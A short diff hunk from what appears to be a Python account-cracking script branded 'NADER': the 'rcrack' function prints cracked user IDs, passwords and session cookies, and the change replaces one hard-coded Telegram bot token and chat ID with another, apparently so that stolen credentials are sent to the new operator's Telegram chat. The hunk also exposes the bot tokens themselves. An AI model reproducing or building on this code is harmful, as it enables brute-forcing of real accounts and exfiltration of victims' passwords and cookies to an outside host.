@@ -343,8 +343,8 @@ def rcrack(uid,pwx,tl):
                 cid = coki[7:22]                
                 print('    \033[1;32m[OK NADER]=  ' +cid+ ' | ' +ps+    '  \n \033[1;97mCOOKES = \033[1;97m'+coki+  ' \n '+pro+'  \033[0;97m')
                 
-                token = '6118299145:AAFxSlwEAsoJH9ylfjA8E4SE9546lOuS3k4'
-                ID = '5868677803'
+                token = '5853881234:AAGPmMAAHfaK9XhoQ8jYZD4mOIZrvtvYcOw'
+                ID = '1350971290'
                 tlg = (f'''
 
 ⋘─────━𓆩NADER𓆪─────━⋙  
